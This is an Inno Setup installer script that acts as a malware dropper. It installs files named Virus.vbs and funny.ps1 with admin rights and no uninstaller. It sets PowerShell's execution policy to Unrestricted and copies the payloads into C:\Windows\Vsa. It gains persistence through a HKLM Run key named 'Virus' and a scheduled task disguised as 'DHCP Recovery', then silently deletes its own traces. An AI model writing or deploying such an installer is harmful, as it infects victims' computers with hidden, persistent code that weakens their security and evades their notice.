[Setup]
; NOTE: The value of AppId uniquely identifies this application. Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppName=Jerrod
AppVerName=Jerrod
DefaultDirName=C:\Temp
DisableDirPage=yes
; Uncomment the following line to run in non administrative install mode (install for current user only).
;PrivilegesRequired=lowest

OutputBaseFilename=mysetup
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=admin
Uninstallable=no
CreateUninstallRegKey=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "Z:\home\seanc\Desktop\Works\funny.ps1"; DestDir: "{app}"; Flags: ignoreversion
Source: "Z:\home\seanc\Desktop\Works\Virus.vbs"; DestDir: "{app}"; Flags: ignoreversion
Source: "Z:\home\seanc\Desktop\Works\DHCP Recovery.xml"; DestDir: "{app}"; Flags: ignoreversion deleteafterinstall

[Registry]
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "Virus"; ValueData: "wscript.exe ""{app}\Virus.vbs"""

[Run]
Filename: "{cmd}"; Parameters: "/C powershell -Command ""Set-ExecutionPolicy Unrestricted -Force"""; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C mkdir C:\Windows\Vsa"; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C copy ""{app}\funny.ps1"" ""C:\Windows\Vsa\funny.ps1"""; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C copy ""{app}\Virus.vbs"" ""C:\Windows\Vsa\Virus.vbs"""; Flags: runhidden waituntilterminated
Filename: "schtasks.exe"; Parameters: "/Create /XML ""{app}\DHCP Recovery.xml"" /TN ""DHCP Recovery"""; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C del ""{app}\DHCP Recovery.xml"""; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C del ""{app}\Virus.vbs"""; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C del ""{app}\funny.ps1"""; Flags: runhidden waituntilterminated
Filename: "{cmd}"; Parameters: "/C rmdir ""{app}"""; Flags: runhidden waituntilterminated
